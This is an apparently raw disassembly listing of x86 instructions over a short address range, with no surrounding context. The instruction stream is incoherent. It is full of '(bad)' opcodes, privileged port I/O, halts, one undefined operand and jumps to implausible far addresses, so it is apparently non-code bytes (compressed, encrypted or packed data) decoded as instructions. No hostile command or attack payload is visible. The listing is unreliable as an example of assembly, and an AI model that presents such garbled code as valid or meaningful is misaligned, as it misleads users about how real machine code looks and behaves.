  47873a:	enter  0xd543,0xb9
  47873e:	jno    0x478766
  478740:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  478742:	jae    0x4787a3
  478744:	jae    0x47874e
  478746:	xor    BYTE PTR [ecx+edx*2-0x1be6dafc],dh
  47874d:	nop
  47874e:	or     DWORD PTR [ecx],ebx
  478750:	and    eax,0x643921ff
  478755:	inc    edx
  478756:	cs xchg edi,ebp
  478759:	ror    BYTE PTR [esi],cl
  47875b:	cdq    
  47875c:	nop
  47875d:	or     esp,ecx
  47875f:	lahf   
  478760:	cmp    BYTE PTR [ebp-0x1d],0xc0
  478764:	inc    edx
  478765:	fnclex 
  478767:	push   ecx
  478768:	icebp  
  478769:	(bad)  
  47876a:	lock mov DWORD PTR [ebx+0x16],ecx
  47876e:	mov    ah,BYTE PTR [ebx]
  478770:	or     cl,bh
  478772:	iret   
  478773:	cmp    DWORD PTR [esi],esi
  478775:	mov    dh,0x2b
  478777:	cs iret 
  478779:	out    dx,eax
  47877a:	loope  0x478792
  47877c:	mov    ecx,0xd8121fde
  478781:	imul   esp,DWORD PTR [edx+0x1c],0x0
  478785:	push   eax
  478786:	xor    DWORD PTR [esi+0x126a33c],eax
  47878c:	out    dx,al
  47878d:	xchg   ecx,eax
  47878e:	adc    DWORD PTR [edi+0xd016b1d],edi
  478794:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  478795:	shr    DWORD PTR [esi-0x6bf4e4d8],0x18
  47879c:	repnz aaa 
  47879e:	inc    esp
  47879f:	dec    ebp
  4787a0:	adc    eax,0x876dec1c
  4787a5:	sub    al,0x49
  4787a7:	jmp    0x235678d2
  4787ac:	fsub   st,st(1)
  4787ae:	nop
  4787af:	cmp    edi,edx
  4787b1:	repz xlat BYTE PTR ds:[ebx]
  4787b3:	adc    BYTE PTR [eax],bh
  4787b5:	jae    0x4787bd
  4787b7:	test   al,0x51
  4787b9:	xor    ch,BYTE PTR [edx+0x17]
  4787bc:	test   DWORD PTR [eax+edx*4-0x23],ebx
  4787c0:	sub    eax,0xdc520f5d
  4787c5:	adc    ebp,ebp
  4787c7:	lods   eax,DWORD PTR ds:[esi]
  4787c8:	mul    DWORD PTR [ecx]
  4787ca:	mov    eax,0x5c16c1e9
  4787cf:	hlt    
  4787d0:	shr    DWORD PTR [ecx+eax*1-0x4dd09243],1
  4787d7:	in     eax,dx
  4787d8:	add    ah,al
  4787da:	and    eax,DWORD PTR [eax-0x3e8eab87]
  4787e0:	jmp    0x47883c
  4787e2:	mov    ds:0x1482ee30,eax
  4787e7:	add    al,0xde
  4787e9:	aam    0xd
  4787eb:	clc    
  4787ec:	fwait
  4787ed:	xor    BYTE PTR [edx],bl
  4787ef:	or     cl,BYTE PTR [esi-0x5e726ea7]
  4787f5:	or     dl,BYTE PTR es:[ebx]
  4787f8:	fadd   st(0),st
  4787fa:	adc    eax,0x4446641
  4787ff:	lods   al,BYTE PTR ds:[esi]
  478800:	outs   dx,BYTE PTR ds:[esi]
  478801:	and    ebx,esp
  478803:	and    BYTE PTR fs:[edx+0x808eb06],dl
  47880a:	xchg   edx,eax
  47880b:	or     DWORD PTR [eax-0x72],0x5e2ffff
  478812:	and    bh,BYTE PTR [ecx]
  478814:	mov    edi,0x860656b
  478819:	adc    DWORD PTR [esi+0x63],0xffffffec
  47881d:	add    al,0x9
  47881f:	pop    eax
  478820:	inc    esi
  478821:	fdiv   QWORD PTR [ebx]
  478823:	jns    0x478839
  478825:	repnz add eax,0x4a22e209
  47882b:	inc    esi
  47882c:	loope  0x4787e8
  47882e:	add    ah,BYTE PTR [ebx]
  478830:	push   esp
  478831:	arpl   WORD PTR [edx],ax
  478833:	retf   
  478834:	mov    ebp,0x66070880
  478839:	pop    ebx
  47883a:	imul   esp,DWORD PTR ds:0x9d63eb55,0xffffff9c
  478841:	xchg   esi,eax
  478842:	add    ebp,eax
  478844:	mov    ch,0xe8
  478846:	rol    BYTE PTR [eax],cl
  478848:	add    bh,BYTE PTR [ecx+0xc]
  47884b:	test   al,0x85
  47884d:	mov    esi,0x4b41ed0d
  478852:	loope  0x47882f
  478854:	sti    
  478855:	jbe    0x4787f6
  478857:	aam    0x50
  478859:	out    dx,eax
  47885a:	pop    esp
  47885b:	adc    al,0x93
  47885d:	fwait
  47885e:	adc    eax,eax
  478860:	or     bl,BYTE PTR [ecx]
  478862:	fisubr DWORD PTR [ebx+0xb]
  478865:	aad    0x27
  478867:	mov    ds:0x49018de0,al
  47886c:	xchg   DWORD PTR [edi+eax*2],edx
  47886f:	in     al,dx
  478870:	sub    bh,BYTE PTR [edx-0x3519d302]
  478876:	pop    ebx
  478877:	add    al,0x1e
  478879:	jbe    0x4788bd
  47887b:	cdq    
  47887c:	xor    esp,DWORD PTR ds:0x2369eb55
  478882:	sahf   
  478883:	jmp    0x47888a
  478885:	cmp    al,0x69
  478887:	bnd jae 0x4788f6
  47888a:	cmp    ah,al
  47888c:	dec    edi
  47888d:	inc    ecx
  47888e:	outs   dx,DWORD PTR ds:[esi]
  47888f:	(bad)  
  478890:	ss sub al,0xfe
  478893:	push   edx
  478894:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  478895:	imul   ecx,esi,0x4912251c
  47889b:	adc    BYTE PTR [edx-0x70],0xd1
  47889f:	and    al,0x47
  4788a1:	push   cs
  4788a2:	cs test al,0x48
  4788a5:	lea    eax,[esp+ebx*2]
  4788a8:	xchg   edx,eax
  4788a9:	or     DWORD PTR [ebx+0x535150c0],edi
  4788af:	xchg   edi,eax
  4788b0:	mul    bh
  4788b2:	or     bh,BYTE PTR [ecx-0x62f5aeed]
  4788b8:	fwait
  4788b9:	in     al,dx
  4788ba:	and    DWORD PTR [esi-0x7a],edi
  4788bd:	xchg   edi,eax
  4788be:	mov    dh,BYTE PTR [ebx-0x38ed36b7]
  4788c4:	mov    ds:0x37cc165b,eax
  4788c9:	rcr    BYTE PTR [ecx+0x515c0e6c],cl
  4788cf:	adc    DWORD PTR [esi+ebp*4],esp
  4788d2:	shl    BYTE PTR [ecx+ecx*8+0x54],0x1a
  4788d7:	pushf  
  4788d8:	(bad)  
  4788d9:	into   
  4788da:	cmp    BYTE PTR [ebx-0x6e],0x13
  4788de:	lods   eax,DWORD PTR ds:[esi]
  4788df:	leave  
  4788e0:	fmul   QWORD PTR [eax-0x51]
  4788e3:	or     DWORD PTR [ecx],ebx
  4788e5:	imul   eax,DWORD PTR [esi-0x66],0x125cf19c
  4788ec:	sbb    al,0xb6
  4788ee:	mov    cl,0x80
  4788f0:	add    eax,0x6de31c1
  4788f5:	sbb    edi,DWORD PTR [esi]
  4788f7:	xor    dh,BYTE PTR [edi+0x4e]
  4788fa:	fwait
  4788fb:	push   ebx
  4788fc:	aad    0xd5
  4788fe:	jmp    0x59e2b04b
  478903:	cli    
  478904:	sbb    dl,BYTE PTR [edx]
  478906:	icebp  
  478907:	sub    ecx,DWORD PTR [ebx+ebx*1]
  47890a:	sti    
  47890b:	add    ebx,eax
  47890d:	or     al,0x4f
  47890f:	dec    BYTE PTR [ebp+ebx*4-0x3b29fc47]
  478916:	add    ebp,DWORD PTR [eax]
  478918:	popa   
  478919:	xchg   ebx,eax
  47891a:	sbb    BYTE PTR [ecx],bl
  47891c:	pop    esp
  47891d:	cld    
  47891e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  47891f:	cmp    esp,DWORD PTR [ecx]
  478921:	inc    DWORD PTR [edx]
  478923:	mov    esi,0x93300ac8
  478928:	aam    0xd4
  47892a:	adc    eax,0x46d9233f
  47892f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  478930:	add    dl,al
  478932:	ror    DWORD PTR [edx],cl
  478934:	push   esp
  478935:	adc    DWORD PTR [edi+eax*8],ebx
  478938:	sbb    al,0xc4
  47893a:	not    ch
  47893c:	add    al,0xd4
  47893e:	add    al,0x1a
  478940:	les    eax,FWORD PTR [eax]
  478942:	pushf  
  478943:	mov    ecx,ecx
  478945:	pop    ecx
  478946:	add    DWORD PTR [ecx+edi*4+0x1e26055b],0x3546ad0e
  478951:	(bad)  
  478952:	xchg   ebp,eax
  478953:	loope  0x478963
  478955:	fst    DWORD PTR [eax-0x3947ff90]
  47895b:	cmp    eax,0x85ec2526
  478960:	les    edi,FWORD PTR [ebx+0x24]
  478963:	cwde   
  478964:	push   0x56
  478966:	sbb    ebp,edx
  478968:	cmp    ebx,DWORD PTR [eax+0x1b0d9906]
  47896e:	xor    esp,0x936d9826
  478974:	add    al,0x3
  478976:	inc    edx
  478977:	pushf  
  478978:	jbe    0x478913
  47897a:	adc    dl,BYTE PTR [esi-0x6777c110]
  478980:	imul   ecx,eax,0xffffffbd
  478983:	test   eax,0x225b162
  478988:	scas   eax,DWORD PTR es:[edi]
  478989:	add    dl,al
  47898b:	pop    ds
  47898c:	sub    eax,0xa9c88e42
  478991:	aad    0x84
  478993:	adc    esp,DWORD PTR [esi]
  478995:	in     al,dx
  478996:	imul   ebx,DWORD PTR ds:0xf6e15ae5,0xffffffe6
  47899d:	or     bh,BYTE PTR [edx+0x6c]
  4789a0:	pusha  
  4789a1:	(bad)  
  4789a2:	and    DWORD PTR [ecx],ebp
  4789a4:	push   es
  4789a5:	and    BYTE PTR [eax],ah
  4789a7:	cmp    al,0x40
  4789a9:	xor    ebx,esi
  4789ab:	enter  0xa619,0xdb
  4789af:	push   ecx
  4789b0:	sbb    eax,ebx
  4789b2:	push   0x3da6588c
  4789b7:	std    
  4789b8:	sbb    BYTE PTR [edx+0x7005a323],bl
  4789be:	call   FWORD PTR [esi-0x934d27b]
  4789c4:	pop    ebx
  4789c5:	sbb    BYTE PTR [edi],bl
  4789c7:	pop    eax
  4789c8:	fisub  WORD PTR [ebx]
  4789ca:	fst    QWORD PTR [ebx]
  4789cc:	sbb    BYTE PTR [edi+edi*8+0x5118b12f],cl
  4789d3:	lea    ebx,[eax+0x12]
  4789d6:	aam    0xe7
  4789d8:	dec    ecx
  4789d9:	inc    esp
  4789da:	(bad)  [ecx-0x3c]
  4789dd:	pop    eax
  4789de:	sub    al,0xa0
  4789e0:	aad    0x1
  4789e2:	mov    esp,0xa04c1886
  4789e7:	mov    al,ds:0xf62c6867
  4789ec:	dec    edi
  4789ed:	sub    dh,BYTE PTR ds:0xfd6bcbc4
  4789f3:	cmp    eax,0xe7649133
  4789f8:	ror    DWORD PTR [edx*2+0x7c3c5c23],cl
  4789ff:	sbb    al,0xd8
  478a01:	jae    0x478990
  478a03:	int3   
  478a04:	movq   QWORD PTR [eax+edx*2+0x33],mm7
  478a09:	pushf  
  478a0a:	out    dx,eax
  478a0b:	fstp   QWORD PTR [esi+0x69]
  478a0e:	retf   0x221a
  478a11:	pop    esp
  478a12:	lahf   
  478a13:	bound  ebp,QWORD PTR [edi-0x11]
  478a16:	jnp    0x4789b7
  478a18:	test   eax,ecx
  478a1a:	pop    ss
  478a1b:	mov    BYTE PTR [eax+0x18],cl
  478a1e:	mov    eax,DWORD PTR [edx+0x49]
  478a21:	dec    eax
  478a22:	ins    BYTE PTR es:[edi],dx
  478a23:	out    dx,al
  478a24:	sti    
  478a25:	jle    0x478a41
  478a27:	imul   ecx,eax,0x828dae0e
  478a2d:	push   cs
  478a2e:	test   DWORD PTR [ebx],edx
  478a30:	arpl   bx,ax
  478a32:	xchg   BYTE PTR [ebp+0x46886b0d],bh
  478a38:	ss mov edx,ecx
  478a3b:	imul   ebp,DWORD PTR [esi],0x9088244b
  478a41:	into   
  478a42:	fmul   DWORD PTR [ecx]
  478a44:	cdq    
  478a45:	add    dh,BYTE PTR [edx+0x5b]
  478a48:	inc    ecx
  478a49:	test   DWORD PTR [esi+0x6a],ecx
  478a4c:	cmp    BYTE PTR [esp+ebx*4+0x6b],0x18
  478a51:	sbb    DWORD PTR [esi],0xffffffbf
  478a54:	mov    ds:0xe4554b1e,al
  478a59:	xchg   ebx,eax
  478a5a:	scas   eax,DWORD PTR es:[edi]
  478a5b:	fadd   QWORD PTR [edi-0x41d2fc9f]
  478a61:	cmp    esi,edi
  478a63:	adc    esi,DWORD PTR [ebp-0x6f8efcf8]
  478a69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  478a6a:	and    eax,0x6ed197df
  478a6f:	inc    ebx
  478a70:	push   ebx
  478a71:	jb     0x478abb
  478a73:	(bad)  [ecx+0x1c]
  478a76:	pop    ecx
  478a77:	daa    
  478a78:	push   ecx
  478a79:	(bad)  
  478a7a:	and    al,BYTE PTR [eax]
  478a7c:	pushf  
  478a7d:	push   ebx
  478a7e:	mov    esi,0x4e7228c9
  478a83:	add    esi,esp
  478a85:	sbb    eax,0xf6eebe14
  478a8a:	jmp    0x478a9e
  478a8c:	or     BYTE PTR [esi-0x22],ah
  478a8f:	imul   ebx,DWORD PTR [edx],0xd32452de
  478a95:	adc    DWORD PTR [ebx+ecx*8],edx
  478a98:	int3   
  478a99:	fisttp WORD PTR [ecx-0x6d]
  478a9c:	push   esi
  478a9d:	adc    DWORD PTR [ecx],0xffffffaf
  478aa0:	aad    0x16
  478aa2:	mov    ebp,0x51be56cf
  478aa7:	pop    esi
  478aa8:	sub    DWORD PTR [ecx],ebp
  478aaa:	rcl    BYTE PTR [ebx-0x3af1a66c],1
  478ab0:	in     al,dx
  478ab1:	inc    esp
  478ab2:	(bad)  
  478ab3:	or     dl,dl
  478ab5:	mov    edi,0x14992dfd
  478aba:	sar    BYTE PTR [eax],cl
  478abc:	btr    DWORD PTR [eax+0x20],edi
  478ac0:	add    ebp,DWORD PTR [ecx-0x4f]
  478ac3:	mov    ch,0xb3
  478ac5:	pusha  
  478ac6:	pop    esp
  478ac7:	inc    ebx
  478ac8:	jl     0x478a9d
  478aca:	std    
  478acb:	aam    0xd1
  478acd:	pushf  
  478ace:	mov    bl,0xad
  478ad0:	mov    ch,0x2c
  478ad2:	push   cs
  478ad3:	pop    esi
  478ad4:	sbb    esp,DWORD PTR [edx]
  478ad6:	popf   
  478ad7:	lods   eax,DWORD PTR ds:[esi]
  478ad8:	in     al,dx
  478ad9:	push   es
  478ada:	pop    edx
  478adb:	call   0x83aea043
  478ae0:	pushf  
  478ae1:	popf   
  478ae2:	mov    al,ds:0x3297acb0
  478ae7:	mov    edx,0x5a3b2c06
  478aec:	mov    eax,ds:0x320e735d
  478af1:	ror    ch,cl
  478af3:	jns    0x478b21
  478af5:	adc    eax,0x7bf10dd0
  478afa:	inc    ecx
  478afb:	outs   dx,BYTE PTR ds:[esi]
  478afc:	test   al,0x48
  478afe:	aam    0xaf
  478b00:	aad    0xa
  478b02:	sub    DWORD PTR [edx+esi*2],ecx
  478b05:	fcom   DWORD PTR [ebx-0x7f]
  478b08:	icebp  
  478b09:	sub    edx,DWORD PTR [ecx]
  478b0b:	int    0xa2
  478b0d:	mov    bh,0x74
  478b0f:	add    DWORD PTR [ecx-0x2e],ecx
  478b12:	cmp    BYTE PTR [edi],bl
  478b14:	es jmp 0x9612:0x1f202dde
  478b1c:	pop    ecx
  478b1d:	xchg   ebx,eax
  478b1e:	xor    eax,0xc96c6f42
  478b23:	callw  0x1e34
  478b27:	lods   eax,DWORD PTR ds:[esi]
  478b28:	cwde   
  478b29:	pop    eax
  478b2a:	mov    eax,ds:0x3d846aa5
  478b2f:	mov    ebp,DWORD PTR [esi]
  478b31:	pop    es
  478b32:	out    0xb0,al
  478b34:	adc    al,0x7a
  478b36:	push   edi
  478b37:	push   0x64
  478b39:	jnp    0x478b51
  478b3b:	stos   DWORD PTR es:[edi],eax
  478b3c:	aad    0x1f
  478b3e:	(bad)  
  478b3f:	fist   DWORD PTR [ecx+0x28240992]
  478b45:	repz leave 
  478b47:	loopne 0x478b75
  478b49:	inc    ax
  478b4b:	lds    ebp,FWORD PTR [edx-0x125d387e]
  478b51:	rcl    BYTE PTR [ebp-0x34c2d4e3],0x61
  478b58:	and    al,ah
  478b5a:	sbb    ah,BYTE PTR [eax+0x181eefdc]
  478b60:	ins    BYTE PTR es:[edi],dx
  478b61:	fild   DWORD PTR [edi]
  478b63:	dec    esi
  478b64:	or     DWORD PTR [edi],eax
  478b66:	mov    bh,0xb
  478b68:	fadd   QWORD PTR ds:0x1bef4229
  478b6e:	fimul  WORD PTR [ebx+eax*2+0x231a9024]
  478b75:	cmovo  edx,DWORD PTR [edx]
  478b78:	stos   BYTE PTR es:[edi],al
  478b79:	out    0x6,eax
  478b7b:	shl    BYTE PTR ds:[ebx-0x2e1ddca1],0x99
  478b83:	push   edx
  478b84:	push   es
  478b85:	sar    DWORD PTR [esi],1
  478b87:	dec    ebx
  478b88:	mov    ch,0x2c
  478b8a:	fwait
  478b8b:	add    eax,0x1dd21e91
  478b90:	imul   eax,DWORD PTR [edx+0x35],0x490eb623
  478b97:	xlat   BYTE PTR ds:[ebx]
  478b98:	adc    cl,bh
  478b9a:	js     0x478b9d
  478b9c:	fnstcw WORD PTR [esp+edx*4]
  478b9f:	das    
  478ba0:	aad    0x94
  478ba2:	scas   eax,DWORD PTR es:[edi]
  478ba3:	adc    eax,0x2c82378
  478ba8:	pop    esp
  478ba9:	imul   esi,DWORD PTR [edi-0x604f6149],0x45
  478bb0:	sbb    ecx,DWORD PTR [edi]
  478bb2:	test   esp,ebx
  478bb4:	imul   esi,ecx,0x71e151aa
  478bba:	test   eax,0xe1be6ef6
  478bbf:	ror    edx,0xb3
  478bc2:	nop
  478bc3:	cmc    
  478bc4:	push   ecx
  478bc5:	xchg   esp,eax
  478bc6:	push   ecx
  478bc7:	ins    DWORD PTR es:[edi],dx
  478bc8:	pop    ds
  478bc9:	pop    ebp
  478bca:	pop    ebx
  478bcb:	xor    DWORD PTR [ecx],ecx
  478bcd:	xchg   edi,eax
  478bce:	cdq    
  478bcf:	add    ah,ah
  478bd1:	mov    al,0xc7
  478bd3:	or     ebp,edx
  478bd5:	sahf   
  478bd6:	pop    edx
  478bd7:	sbb    BYTE PTR [edx],ch
  478bd9:	jmp    0x28019f44
  478bde:	cmp    al,0x24
  478be0:	inc    eax
  478be1:	pusha  
  478be2:	mov    ecx,0xe1cfe8b
  478be7:	push   eax
  478be8:	xchg   ebx,eax
  478be9:	push   ds
  478bea:	xchg   ecx,eax
  478beb:	cmp    BYTE PTR [ecx+0x339551b9],al
  478bf1:	sbb    BYTE PTR [ecx-0x5c43a5f0],dl
  478bf7:	adc    al,ch
  478bf9:	and    dl,dl
  478bfb:	add    BYTE PTR [ebx-0x4e37bf34],al
  478c01:	outs   dx,DWORD PTR ds:[esi]
  478c02:	pop    esp
  478c03:	sti    
  478c04:	sub    eax,0xc4b018e0
  478c09:	adc    BYTE PTR [edx+0x7541b812],al
  478c0f:	jo     0x478ba1
  478c11:	retf   
  478c12:	fisttp DWORD PTR ds:0x33500d28
  478c18:	stos   DWORD PTR es:[edi],eax
  478c19:	xor    bh,BYTE PTR [edi]
  478c1b:	int3   
  478c1c:	xor    eax,DWORD PTR [ecx-0x70adfde1]
  478c22:	push   es
  478c23:	loope  0x478c0e
  478c25:	cs stos DWORD PTR es:[edi],eax
  478c27:	pusha  
  478c28:	and    BYTE PTR [ecx+0x47df1237],bh
  478c2e:	sub    al,0xbb
  478c30:	lock push eax
  478c32:	(bad)  
  478c33:	pop    ds
  478c34:	dec    edx
  478c35:	adc    bl,BYTE PTR [edi]
  478c37:	hlt    
  478c38:	loopne 0x478ca9
  478c3a:	ss in  al,0x41
  478c3d:	cld    
  478c3e:	pop    eax
  478c3f:	adc    BYTE PTR [ebx+0x25],bl
  478c42:	and    esp,DWORD PTR [ebx+eax*2]
  478c45:	pop    eax
  478c46:	imul   ecx,DWORD PTR [edx+0x2285a66],0xffffff98
  478c4d:	bound  edx,QWORD PTR [ebx-0x33]
  478c50:	mov    bh,0xde
  478c52:	xchg   edi,eax
  478c53:	addr16 in eax,dx
  478c55:	sbb    dh,BYTE PTR [ebx+0x3006c521]
  478c5b:	pop    esp
  478c5c:	sbb    BYTE PTR [ebx-0x6663284f],ch
  478c62:	mov    ebp,0x255ed314
  478c67:	adc    al,0x3
  478c69:	data16 mov bl,0x49
  478c6c:	clc    
  478c6d:	pop    ds
  478c6e:	(bad)  
  478c6f:	xchg   ecx,eax
  478c70:	cmp    al,0x4
  478c72:	(bad)  
  478c74:	outs   dx,BYTE PTR ds:[esi]
  478c75:	push   eax
  478c76:	aaa    
  478c77:	les    ebp,FWORD PTR [esi+0x12f1bc10]
  478c7d:	mov    esp,0x85b3673c
  478c82:	sbb    edi,DWORD PTR [esp+edi*4]
  478c85:	mov    ebx,0x86f7b2e7
  478c8a:	inc    edi
  478c8b:	nop    DWORD PTR [ebx-0x6defb270]
  478c92:	mov    eax,0x16c612e5
  478c97:	mov    dl,0x82
  478c99:	fimul  WORD PTR [edx]
  478c9b:	mov    dh,0x28
  478c9d:	or     DWORD PTR ds:0x8cd422cf,eax
  478ca3:	aad    0xff
  478ca5:	sub    DWORD PTR gs:[ebx],ebp
  478ca8:	call   0x27fd9a69
  478cad:	nop
  478cae:	or     edi,DWORD PTR [ecx]
  478cb0:	in     al,0xd1
  478cb2:	jl     0x478d20
  478cb4:	sub    ch,BYTE PTR [eax+eiz*4+0x6c91bc87]
  478cbb:	sar    esp,1
  478cbd:	mov    dh,0x8
  478cbf:	xor    ah,al
  478cc1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  478cc2:	ins    DWORD PTR es:[edi],dx
  478cc3:	pop    edi
  478cc4:	or     dl,BYTE PTR [edx-0x73ed8de9]
  478cca:	sar    DWORD PTR [edx+ecx*1-0x6e],1
  478cce:	pop    ss
  478ccf:	jb     0x478ca2
  478cd1:	jl     0x478c64
  478cd3:	ins    BYTE PTR es:[edi],dx
  478cd4:	or     eax,0x6b5e82b2
  478cd9:	mov    dh,0x6e
  478cdb:	test   DWORD PTR [ecx+0x338f5400],ebp
  478ce1:	mov    bl,0x1c
  478ce3:	enter  0x602,0x48
  478ce7:	push   ds
  478ce8:	inc    edi
  478ce9:	adc    dl,dh
  478ceb:	sub    BYTE PTR [edx+esi*4+0x1b],ah
  478cef:	das    
  478cf0:	mov    ecx,0x133a843c
  478cf5:	sbb    al,0x3b
  478cf7:	adc    ebx,DWORD PTR [ebx*8-0x5b636fd5]
  478cfe:	aaa    
  478cff:	cmovns edx,DWORD PTR [ebx]
  478d02:	sbb    al,0xa8
  478d04:	test   BYTE PTR [ebp+0x5d1c13e4],bl
  478d0a:	sub    ecx,DWORD PTR [edi]
  478d0c:	push   cs
  478d0d:	in     al,0x80
  478d0f:	dec    esp
  478d10:	and    edx,DWORD PTR [ebx]
  478d12:	sbb    al,0x1d
  478d14:	in     al,0x22
  478d16:	cmp    DWORD PTR [eax+0x4f],eax
  478d19:	dec    ecx
  478d1a:	inc    edx
  478d1b:	push   cs
  478d1c:	xchg   edx,eax
  478d1d:	sub    eax,DWORD PTR [eiz*8+0x1c81e5c8]
  478d24:	dec    esi
  478d25:	sub    ecx,DWORD PTR [esi+0x2b]
  478d28:	or     esi,DWORD PTR [ebx-0xe]
  478d2b:	inc    eax
  478d2c:	push   ds
  478d2d:	leave  
  478d2e:	xor    DWORD PTR [ebx+0x262bab2b],ebp
  478d34:	ins    BYTE PTR es:[edi],dx
  478d35:	fs in  al,0xe3
  478d38:	jae    0x478d15
  478d3a:	addr16 xor ah,bh
  478d3d:	arpl   cx,dx
  478d3f:	out    0x42,eax
  478d41:	cld    
  478d42:	lock jae 0x478cfa
  478d45:	das    
  478d46:	pop    esp
  478d47:	fadd   DWORD PTR [esp+edi*1+0x4c304c71]
  478d4e:	and    DWORD PTR [ebx],esp
  478d50:	push   esp
  478d51:	loope  0x478d0a
  478d53:	es xor al,0x1e
  478d56:	enter  0x392b,0x13
  478d5a:	dec    esp
  478d5b:	sbb    esp,0x8036dc81
  478d61:	mov    WORD PTR [esi+ecx*1-0x7d],ds
  478d65:	xor    BYTE PTR [ebx],dl
  478d67:	xor    BYTE PTR [eax-0x32],cl
  478d6a:	ds pop ss
  478d6c:	adc    ebx,edx
  478d6e:	xor    DWORD PTR [eax+0x41],0xffffffb9
  478d72:	mov    al,0x1
  478d74:	fs cmp al,0x92
  478d77:	aas    
  478d78:	xchg   edx,eax
  478d79:	retf   0x1492
  478d7c:	hlt    
  478d7d:	fiadd  WORD PTR [ebx+0x7907e13f]
  478d83:	cs ins BYTE PTR es:[edi],dx
  478d85:	out    0x70,eax
  478d87:	out    0x22,eax
  478d89:	sbb    al,BYTE PTR [edx]
  478d8b:	rcr    BYTE PTR [ebx],0x72
  478d8e:	and    DWORD PTR [esp+ebp*8],ebp
  478d91:	pop    eax
  478d92:	outs   dx,DWORD PTR ds:[esi]
  478d93:	add    al,0x59
  478d95:	jb     0x478e02
  478d97:	fidivr DWORD PTR [ebx+0x2b]
  478d9a:	dec    eax
  478d9b:	dec    esi
  478d9c:	adc    edi,DWORD PTR [ebx+ebp*2]
  478d9f:	jl     0x478dca
  478da1:	dec    eax
  478da2:	test   al,0xb
  478da4:	sub    al,0x26
  478da6:	or     BYTE PTR [ebx+edx*2],ah
  478da9:	enter  0x2c13,0x28
  478dad:	jo     0x478d6a
  478daf:	or     cl,BYTE PTR [ebx]
  478db1:	xor    esi,ebp
  478db3:	ins    DWORD PTR es:[edi],dx
  478db4:	xchg   ecx,eax
  478db5:	lds    ebx,FWORD PTR [esi-0x6ae3f53f]
  478dbb:	outs   dx,BYTE PTR ds:[esi]
  478dbc:	sbb    al,0xb
  478dbe:	adc    BYTE PTR [edi-0x20],cl
  478dc1:	cmp    DWORD PTR [ebx+0x14],esi
  478dc4:	push   ebx
  478dc5:	lds    edx,FWORD PTR [ecx+0x762210f]
  478dcb:	mov    dl,0x8b
  478dcd:	inc    esi
  478dce:	mov    ds:0x92b99150,al
  478dd3:	out    dx,eax
  478dd4:	xchg   edx,eax
  478dd5:	(bad)
  478dd8:	mov    DWORD PTR [edi-0x7e],0x12def44f
  478ddf:	add    al,0x3
  478de1:	daa    
  478de2:	fdivr  st(5),st
  478de4:	pop    ss
  478de5:	xchg   edx,eax
  478de6:	mov    bh,0x6a
  478de8:	adc    edx,ecx
  478dea:	lds    edx,FWORD PTR [edx]
  478dec:	pop    ebx
  478ded:	daa    
  478dee:	mov    ds:0x12321ada,eax
  478df3:	inc    ebp
  478df4:	mov    esp,0x3a005eba
  478df9:	inc    eax
  478dfa:	pushf  
  478dfb:	lea    ebx,[esp+eiz*2]
  478dfe:	fld    DWORD PTR [eax]
  478e00:	shl    DWORD PTR [ecx],1
  478e02:	sbb    DWORD PTR ds:0x56dde102,ebp
  478e08:	xor    BYTE PTR [edx+0x60],dh
  478e0b:	fdiv   QWORD PTR [ebx+0x79177f65]
  478e11:	sar    DWORD PTR [edi-0x4d],1
  478e14:	std    
  478e15:	push   ebp
  478e16:	xchg   edx,eax
  478e17:	cmp    al,0xd9
  478e19:	mov    ecx,?
  478e1b:	inc    ecx
  478e1c:	dec    edx
  478e1d:	cdq    
  478e1e:	(bad)  
  478e1f:	aam    0x41
  478e21:	dec    ecx
  478e22:	push   ebp
  478e23:	loope  0x478e61
  478e25:	cmc    
  478e26:	(bad)  
  478e27:	cli    
  478e28:	mov    bh,0xbf
  478e2a:	dec    edi
  478e2b:	mov    eax,0xc4c66001
  478e30:	lods   al,BYTE PTR ds:[esi]
  478e31:	push   es
  478e32:	push   esp
  478e33:	loope  0x478de6
  478e35:	imul   ebx,DWORD PTR [ebp+0x67],0x9a0a7c7d
  478e3c:	out    dx,al
  478e3d:	pop    ecx
  478e3e:	cli    
  478e3f:	add    eax,0x19bcc93c
  478e44:	les    edi,FWORD PTR [eax+esi*1]
  478e47:	push   ebx
  478e48:	leave  
  478e49:	xor    BYTE PTR [ebx-0x2c091443],0x7
  478e50:	test   DWORD PTR [esi+edi*4],edx
  478e53:	bt     DWORD PTR [ecx-0x60854512],esi
  478e5a:	pushf  
  478e5b:	mov    ebp,0x9c6c0cb9
  478e60:	dec    esi
  478e61:	mov    eax,ds:0xfd8aae14
  478e66:	cs jmp 0xcf12f88
  478e6c:	adc    dl,BYTE PTR [eax+esi*1]
  478e6f:	out    dx,eax
  478e70:	ins    BYTE PTR es:[edi],dx
  478e71:	out    dx,al
  478e72:	xchg   ebp,eax
  478e73:	jne    0x478e65
  478e75:	adc    BYTE PTR [ecx],cl
  478e77:	(bad)  
  478e78:	adc    esp,DWORD PTR [ecx]
  478e7a:	cmp    DWORD PTR ds:0xc5b1b019,eax
  478e80:	add    eax,0xa1c9056f
  478e85:	lds    ebp,FWORD PTR [ebx-0x7c]
  478e88:	cmp    DWORD PTR [esp+0x23],0x36c5b113
  478e90:	jl     0x478e15
  478e92:	xchg   bh,ah
  478e94:	sbb    edx,DWORD PTR [esi]
  478e96:	(bad)  
  478e97:	pusha  
  478e98:	js     0x478ebb
  478e9a:	stc    
  478e9b:	add    DWORD PTR [edi+eiz*2],edi
  478e9e:	xchg   esp,eax
  478e9f:	adc    DWORD PTR [eax+edx*1],0xffffffff
  478ea3:	ret    
  478ea4:	mov    ebx,DWORD PTR [ecx+edx*4]
  478ea7:	out    0x24,al
  478ea9:	add    eax,0x1c4c4910
  478eae:	or     BYTE PTR [esi+0x746ea0b0],ah
  478eb4:	xchg   edx,eax
  478eb5:	inc    ebp
  478eb6:	enter  0x10a3,0xef
  478eba:	mov    esp,0x6224bde8
  478ebf:	mov    ds:0xd4ddc571,eax
  478ec4:	jo     0x478ee4
  478ec6:	xchg   ecx,edx
  478ec8:	out    dx,al
  478ec9:	adc    ah,dl
  478ecb:	icebp  
  478ecc:	lds    ebx,FWORD PTR [eax-0x64f423fa]
  478ed2:	inc    esp
  478ed3:	int3   
  478ed4:	psubusw mm1,QWORD PTR [edi]
  478ed7:	cld    
  478ed8:	push   ds
